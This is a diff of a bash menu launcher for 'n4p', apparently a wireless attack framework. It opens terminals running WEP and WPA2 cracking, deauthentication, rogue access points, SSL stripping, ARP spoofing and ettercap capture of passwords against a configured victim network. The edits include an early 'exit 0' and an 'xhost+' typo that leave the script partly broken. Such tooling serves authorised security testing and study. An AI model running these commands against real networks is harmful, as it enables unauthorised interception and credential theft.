@@ -1,7 +1,22 @@
 
 #!/bin/bash
-xhost +
 
+id=`id -u`
+safeuser="nobody"
+
+if [ $id = "0" ]
+then
+        echo "we're root. dangerous!"
+        sudo -Eu $safeuser $0
+else
+    echo "I'm not root"
+    id
+fi
+#[[ $(id -u) = 0 ]] && sudo -u nobody $0
+id -u
+id
+[[ $(id -u) != 0 ]] && xhost+ || echo "This script can not be ran as root or with sudo." 1>&2 #; exit 1
+exit 0
 #retrieve absolute path structures so we can use symlinks and config files
 SOURCE="${BASH_SOURCE[0]}"
 while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
@@ -10,8 +25,8 @@ while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a sym
     [[ $SOURCE != /* ]] && SOURCE="$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
 done
 DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
-DIR_CONF=/etc/n4p/
-DIR_LOGO=/usr/share/n4p/
+DIR_CONF=/etc/n4p
+DIR_LOGO=/usr/share/n4p
 
 get_RCstatus() # What is the status from OpenRC of the service
 {
@@ -20,7 +35,7 @@ get_RCstatus() # What is the status from OpenRC of the service
 
 get_name() #Parse the values in the config file
 {
-    USE=$(grep $1 ${DIR_CONF}n4p.conf | awk -F= '{print $2}')
+    USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
 }
 
 # Text color variables
@@ -31,7 +46,7 @@ BLD_WHT=${txtbld}$(tput setaf 7) # white
 PUR=$(tput setaf 5)              # purple
 TXT_RST=$(tput sgr0)             # Reset
 EYES=$(tput setaf 6)
-AP_GATEWAY=$(grep routers ${DIR_CONF}dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
+AP_GATEWAY=$(grep routers ${DIR_CONF}/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
 get_name "IFACE1="; IFACE1=$USE
 get_name "OS="; OS=$USE
 get_name "NETWORKMANAGER="; NETWORKMANAGER=$USE
@@ -39,29 +54,29 @@ get_name "OS="; OS=$USE
 get_name "INTERFACE="; INTERFACE=$USE
 MON="${IFACE1}mon"
 FAILSAFE="th8934pjghwt74ygp"
-echo "${BLD_TEA}$(cat ${DIR_LOGO}opening.logo)${TXT_RST}"; sleep 1
+echo "${BLD_TEA}$(cat ${DIR_LOGO}/opening.logo)${TXT_RST}"; sleep 1
 
-SESSIONFOLDER=/tmp/n4p/ # Set our tmp working configuration directory and then build config files
-[ ! -d "$SESSIONFOLDER" ] && mkdir "$SESSIONFOLDER"; mkdir -p "$SESSIONFOLDER" "${SESSIONFOLDER}logs"
+SESSIONFOLDER=/tmp/n4p # Set our tmp working configuration directory and then build config files
+[ ! -d "$SESSIONFOLDER" ] && mkdir "$SESSIONFOLDER"; mkdir -p "$SESSIONFOLDER" "${SESSIONFOLDER}/logs"
 
 if [[ $NETWORKMANAGER == "True" ]]; then #n4p cant operate airmon and such with network manager hogging everything. We must kill it.
-  if [[ $OS == "Pentoo" ]]; then
-    if [[ -f /etc/init.d/NetworkManager ]]; then
-      sudo /etc/init.d/NetworkManager stop
-    else
-      echo "Error in Config file. NetworkManager does not appear to be present."
-    fi
-  else # were not using pentoo kill nm for systemd
-    if [[ -f /etc/init.d/network-manager ]]; then
-      sudo service network-manager stop
-    fi
-  fi
+	if [[ $OS == "Pentoo" ]]; then
+		if [[ -f /etc/init.d/NetworkManager ]]; then
+            		sudo /etc/init.d/NetworkManager stop
+        	else
+            		echo "Error in Config file. NetworkManager does not appear to be present."
+        	fi
+	else # were not using pentoo kill nm for systemd
+        	if [[ -f /etc/init.d/network-manager ]]; then
+           		 sudo service network-manager stop
+        	fi
+	fi
 elif [[ $OS == "Pentoo" ]]; then
-    if [[ -e /etc/init.d/net.$IFACE1 ]]; then
-        echo "$INFO Getting status of $IFACE1"
-        get_RCstatus "net.$IFACE1"
-        [[ $STATUS == 'started' ]] && /etc/init.d/net.$IFACE1 stop
-    fi
+        if [[ -e /etc/init.d/net.$IFACE1 ]]; then
+            echo "$INFO Getting status of $IFACE1"
+            get_RCstatus "net.$IFACE1"
+            [[ $STATUS == 'started' ]] && /etc/init.d/net.$IFACE1 stop
+        fi
 fi
 
 trap killemAll INT HUP;
@@ -101,9 +116,7 @@ menu()
     elif [[ $CHOICE == "simple" || $CHOICE == "basic" || $CHOICE == "Simple" || $CHOICE == "Basic" ]]; then
         INTERFACE="Basic"
         menu
-    #The current defined menu options are compleated 
-    ################################################################################################################################################
-    #Now we look for user actions
+    #The current defined menu options are compleated now we look for user actions
     elif [[ $CHOICE == 0 || $CHOICE == "quit" || $CHOICE == "exit" ]]; then
         killemAll $FAILSAFE
     elif [[ $CHOICE == "?" || $CHOICE == "help" || $CHOICE == "Help" ]]; then
@@ -117,60 +130,52 @@ menu()
         echo "Any basic mode menu option number. 0-9"
         echo "Any bash command"
     elif [[ $CHOICE == 1 ]]; then
-        sudo $EDITOR ${DIR_CONF}n4p.conf
+        sudo nano /etc/n4p/n4p.conf
     elif [[ $CHOICE == 2 ]]; then
-        sudo xterm -bg black -fg DodgerBlue1 -T "Recon" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./recon ; bash\"" &>/dev/null &
-        #sudo xterm -bg black -fg DodgerBlue1 -T "Recon" -geometry 90x20 -e ./modules/recon &>/dev/null &
+        sudo xterm -bg black -fg blue -T "Recon" -geometry 90x20 -e ./modules/recon &>/dev/null &
     elif [[ $CHOICE == 3 ]]; then
         if [[ $ATTACK == "WPS" ]]; then
-            sudo xterm -bg black -fg DodgerBlue1 -T "Wash" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./wash ; bash\"" &>/dev/null &
+            sudo xterm -bg black -fg blue -T "Wash" -geometry 90x20 -e ./modules/wash &>/dev/null &
         else
-            sudo xterm -bg black -fg DodgerBlue1 -T "Dump cap" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./dump ; bash\"" &>/dev/null &
+            sudo xterm -bg black -fg blue -T "Dump cap" -geometry 90x20 -e ./modules/dump &>/dev/null &
         fi
     elif [[ $CHOICE == 4 ]]; then
         get_name "CRACK="; CRACK=$USE
-        if [[ $CRACK == "Aircrack" ]]; then
+        if [[ $CRACK == "Aircrack-ng" ]]; then
             get_name "ATTACK="; ATTACK=$USE
             if [[ $ATTACK == "WEP" ]]; then
                 get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
-                #sudo xterm -T "WEP CRACK ${VICTIM_BSSID}" -geometry 90x15 -e aircrack-ng ${SESSIONFOLDER}/${VICTIM_BSSID}-01.cap &>/dev/null &
-                sudo xterm -bg black -fg DodgerBlue1 -T "WEP CRACK ${VICTIM_BSSID}" -geometry 90x20 -e "bash -ic \"aircrack-ng ${SESSIONFOLDER}/${VICTIM_BSSID}-01.cap ; bash\"" &>/dev/null &
-            elif [[ $ATTACK == "HANDSHAKE" ]]; then
-                get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
-                get_name "WORD_LIST="; WORD_LIST=$USE
-                sudo xterm -bg black -fg DodgerBlue1 -T "WPA2 CRACK ${VICTIM_BSSID}" -geometry 90x20 -e "bash -ic \"aircrack-ng -w $WORD_LIST -b ${VICTIM_BSSID} ${SESSIONFOLDER}/${VICTIM_BSSID}-01.cap ; bash\"" &>/dev/null &
+                sudo xterm -T "WEP CRACK ${VICTIM_BSSID}" -geometry 90x15 -e aircrack-ng ${SESSIONFOLDER}/${VICTIM_BSSID}-01.cap &>/dev/null &
             fi
         elif [[ $CRACK == "Hashcat" ]]; then
-            sudo xterm -bg black -fg DodgerBlue1 -T "Cracking" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./cracking ; bash\"" &>/dev/null &
+            sudo xterm -hold -bg black -fg blue -T "Cracking" -geometry 90x20 -e ./modules/cracking &>/dev/null &
         else
             echo "CRACK= configuration error, check config file"
         fi
     elif [[ $CHOICE == 5 ]]; then
         get_name "ATTACK="; ATTACK=$USE
         if [[ $ATTACK == "Handshake" || $ATTACK == "Karma" || -z $ATTACK ]]; then
-            sudo xterm -bg black -fg DodgerBlue1 -T "Airbase" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./airbase ; bash\"" &>/dev/null &
+            sudo xterm -bg black -fg blue -T "Airbase" -geometry 90x20 -e ./modules/airbase &>/dev/null &
         elif [[ $ATTACK == "WPS" ]]; then
-            sudo xterm -bg black -fg DodgerBlue1 -T "Bully" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./recon ; bash\"" &>/dev/null &
+            sudo xterm -bg black -fg blue -T "Bully" -geometry 90x20 -e ./modules/recon &>/dev/null &
         elif [[ $ATTACK == "SslStrip" ]]; then
             echo -e "SSL Strip Log File\n" > ${SESSIONFOLDER}/ssl.log
-            #sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}/ssl.log &>/dev/null &
-            sudo xterm -bg black -fg DodgerBlue1 -T "SSL Strip" -geometry 50x5 -e "bash -ic \"sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}/ssl.log ; bash\"" &>/dev/null &
+            sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}/ssl.log &>/dev/null &
         elif [[ $ATTACK == "WPE" ]]; then
-            sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 90x20 -e ./modules/wpe  &>/dev/null &
+            sudo xterm -bg black -fg blue -T "WPE" -geometry 90x20 -e ./modules/wpe  &>/dev/null &
         elif [[ $ATTACK == "SslStrip" ]]; then
             get_name "IFACE1="; IFACE1=$USE
             get_name "ARP_VICTIM="; ARP_VICTIM=$USE
-            #sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
-            sudo xterm -bg black -fg DodgerBlue1 -T "Bully" -geometry 90x20 -e "bash -ic \"arpspoof -i $IFACE1 $ARP_VICTIM ; bash\"" &>/dev/null &
+            sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
         fi
     elif [[ $CHOICE == 6 ]]; then
-        sudo xterm -bg black -fg DodgerBlue1 -T "iptables" -geometry 90x20 -e "bash -ic \"${DIR}/modules/./firewall ; bash\"" &>/dev/null &
+        sudo xterm -bg black -fg blue -T "iptables" -geometry 90x20 -e ./modules/firewall &>/dev/null &
     elif [[ $CHOICE == 7 ]]; then
         get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
         get_name "STATION="; STATION=$USE
         get_name "IFACE1="; IFACE1=$USE
         MON="${IFACE1}mon"
-        sudo xterm -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null &
+        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon &>/dev/null &
     elif [[ $CHOICE == 8 ]]; then
         get_name "BRIDGE_NAME="; BR_NAME=$USE
         get_name "AP="; AP_NAME=$USE
@@ -178,11 +183,11 @@ menu()
         [[ ! -f ${SESSIONFOLDER}/recovered_passwords.pcap ]] && sudo touch ${SESSIONFOLDER}/recovered_passwords.pcap
         get_name "ETTERCAP_OPTIONS="; ETTERCAP_OPTIONS=$USE
         if [[ $BRIDGED == "True" ]]; then
-             sudo xterm -bg black -fg DodgerBlue1 -T "ettercap" -geometry 90x20 -e "bash -ic \"ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} ; bash\"" &>/dev/null &
+            sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} &>/dev/null &
         elif [[ $AP_NAME == "AIRBASE" ]]; then
-             sudo xterm -bg black -fg DodgerBlue1 -T "ettercap at0" -geometry 90x20 -e "bash -ic \"ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${SESSIONFOLDER}/recovered_passwords.pcap ; bash\"" &>/dev/null &
-        elif [[ $AP_NAME == "HOSTAPD" ]]; then
-           sudo xterm -bg black -fg DodgerBlue1 -T "ettercap $IFACE1" -geometry 90x20 -e "bash -ic \"ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}/recovered_passwords.pcap ; bash\"" &>/dev/null &
+            sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${SESSIONFOLDER}/recovered_passwords.pcap &>/dev/null &
+        #elif [[ $AP_NAME == "HOSTAPD" ]]; then
+        #   sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}/recovered_passwords.pcap &>/dev/null &
         fi
     else
         ###########################################################################################################################
@@ -195,24 +200,24 @@ menu()
                 if [[ ! -f modules/$CHOICE ]]; then
                     echo "${BLD_TEA}You seem to be confused.${TXT_RST}"
                 else
-                    RUN=$CHOICE
+                    run=$CHOICE
                 fi
             elif [[ $CHOICE == "run" ]]; then
                 if [[ -n $CHOICE ]]; then # Check if the CHOICE is empty before trying to execute
-                    sudo xterm -bg black -fg DodgerBlue1 -T "N4P Advanced runtime" -geometry 65x15 -e "bash -ic \"${DIR}/modules/./$RUN ; bash\"" &>/dev/null &
+                    sudo xterm -hold -bg black -fg blue -T "N4P Advanced runtime" -geometry 65x15 -e ./modules/$run &>/dev/null &
                     #sudo ./modules/$CHOICE
                 else
                     echo "${BLD_TEA}Nothing to do!${TXT_RST}"
                 fi
             elif [[ $CHOICE == "show options" ]]; then
-              if [[ -n $RUN ]]; then # Check if the CHOICE is empty before trying to execute
-                  grep get_name\ \" modules/$RUN | cut -d '"' -f 2
+              if [[ -n $run ]]; then # Check if the CHOICE is empty before trying to execute
+                  grep get_name\ \" modules/$run | cut -d '"' -f 2
               else
                   echo "${BLD_TEA}Nothing to do!${TXT_RST}"
               fi
             elif [[ $CHOICE == "list modules" || $CHOICE == "show modules" ]]; then
                 printf %s "$(ls modules/)"
-            #elif [[ $CHOICE = set* ]]; then #We may in future make variables dynamic from the module
+            #elif [[ $CHOICE = set* ]]; then
             #      AP=tester
             #      cut_CHOICE $CHOICE
             #      var=$(echo "$CHOICE" | cut -d ' ' -f 1)
@@ -239,8 +244,7 @@ killemAll()
         clear
         menu
     else
-        sudo ${DIR}/modules/./rebuild_network
-        #sudo ./modules/rebuild_network
+        sudo ./modules/rebuild_network
         xhost -
         echo "${BLD_TEA}$(cat ${DIR_LOGO}/zed.logo)${TXT_RST}"
         exit 0
